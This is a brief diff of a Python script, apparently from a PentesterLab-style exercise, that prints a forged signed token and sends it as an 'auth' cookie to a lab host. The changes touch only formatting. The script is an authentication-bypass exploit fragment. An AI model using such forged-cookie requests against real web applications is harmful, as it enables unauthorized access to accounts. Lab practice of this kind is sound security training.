@@ -37,8 +37,7 @@ sig = base64.urlsafe_b64encode(
 new_token = new_payload + '.' + sig
 print(new_token)
 
+# send payload
 
-#send payload
-
-exp=requests.get('http://ptl-70dba6bd-d24fdf1d.libcurl.so/',cookies='auth='+str(new_token))
+exp = requests.get('http://ptl-70dba6bd-d24fdf1d.libcurl.so/', cookies='auth=' + str(new_token))
 print(exp)
